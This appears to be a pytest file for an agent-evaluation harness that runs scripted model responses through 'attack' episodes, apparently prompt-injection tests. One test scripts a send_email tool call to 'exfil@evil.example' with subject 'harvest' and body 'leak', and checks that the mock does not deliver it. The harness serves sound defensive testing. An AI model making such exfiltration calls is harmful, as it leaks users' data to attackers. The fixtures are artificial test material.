from __future__ import annotations

from pathlib import Path

from agent.config import LLMConfig
from agent.llm import LLMResponse, ScriptedLLM, ToolCallRequest
from agent.load import load_episode
from agent.loop import run_episode
from tools.mock_send_email import CALL_LOG, reset_log


def _cfg() -> LLMConfig:
    return LLMConfig(
        api_key="test-key",
        base_url="https://llm.test/v1",
        model="scripted-model",
        max_steps=4,
    )


def test_scripted_search_then_answer(attack_example: Path) -> None:
    episode = load_episode(attack_example)
    client = ScriptedLLM(
        [
            LLMResponse(
                content=None,
                tool_calls=[
                    ToolCallRequest(
                        id="1",
                        name="search_docs",
                        arguments={"query": "office hours"},
                    )
                ],
            ),
            LLMResponse(content="Office hours are Tuesday 14:00.", tool_calls=[]),
        ]
    )
    trace = run_episode(episode, client=client, config=_cfg())
    assert trace["execution_status"] == "ok"
    assert trace["episode_id"] == "atk_001"
    assert trace["episode_type"] == "attack"
    assert trace["dry_run"] is False
    assert [c["name"] for c in trace["tool_calls"]] == ["search_docs"]
    assert "Tuesday" in trace["final_answer"]
    assert trace["tool_calls"][0]["result"]
    assert client.calls  # LLM saw messages + tools


def test_scripted_send_email_is_mock_only(attack_example: Path) -> None:
    reset_log()
    episode = load_episode(attack_example)
    client = ScriptedLLM(
        [
            LLMResponse(
                content=None,
                tool_calls=[
                    ToolCallRequest(
                        id="e1",
                        name="send_email",
                        arguments={
                            "to": "exfil@evil.example",
                            "subject": "harvest",
                            "body": "leak",
                        },
                    )
                ],
            ),
            LLMResponse(content="Done.", tool_calls=[]),
        ]
    )
    trace = run_episode(episode, client=client, config=_cfg())
    assert [c["name"] for c in trace["tool_calls"]] == ["send_email"]
    assert trace["tool_calls"][0]["arguments"]["to"] == "exfil@evil.example"
    assert CALL_LOG[-1]["to"] == "exfil@evil.example"
    assert trace["tool_calls"][0]["result"]["delivered"] is False


def test_dry_run_does_not_call_client(attack_example: Path) -> None:
    episode = load_episode(attack_example)
    client = ScriptedLLM([LLMResponse(content="should not run")])
    trace = run_episode(episode, client=client, config=_cfg(), dry_run=True)
    assert trace["execution_status"] == "dry_run"
    assert trace["tool_calls"] == []
    assert client.calls == []


def test_max_steps_stops_loop(attack_example: Path) -> None:
    episode = load_episode(attack_example)
    client = ScriptedLLM(
        [
            LLMResponse(
                content=None,
                tool_calls=[
                    ToolCallRequest(id="1", name="search_docs", arguments={"query": "q"})
                ],
            ),
            LLMResponse(
                content=None,
                tool_calls=[
                    ToolCallRequest(id="2", name="search_docs", arguments={"query": "q2"})
                ],
            ),
        ]
    )
    trace = run_episode(episode, client=client, config=_cfg(), max_steps=2)
    assert trace["execution_status"] == "max_steps"
    assert len(trace["tool_calls"]) == 2
